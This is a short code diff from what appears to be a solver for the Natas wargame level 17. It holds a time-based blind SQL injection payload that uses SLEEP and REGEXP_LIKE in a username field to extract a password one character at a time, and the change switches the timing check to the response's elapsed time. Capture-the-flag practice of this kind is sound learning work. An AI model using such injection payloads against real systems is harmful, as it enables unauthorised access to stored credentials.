@@ -7,15 +7,13 @@ password = ""
 
 
 def predicate(prefix: str, nextChar: str, threshold: int = 1):
-    start_time = time.time()
     try:
         with Auther.request(17, data={
             'username': f'natas18" AND IF(REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c"), SLEEP({threshold}), SLEEP(0)) AND "" LIKE "'
-        }):
-            end_time = time.time()
+        }) as r:
+            return r.elapsed.seconds >= threshold
     except:
         return predicate(prefix, nextChar, threshold)
-    return (end_time - start_time) >= threshold
     # return (end_time - start_time) >= threshold if (end_time - start_time) >= 0.5 else predicate(prefix, nextChar, threshold)
 
 
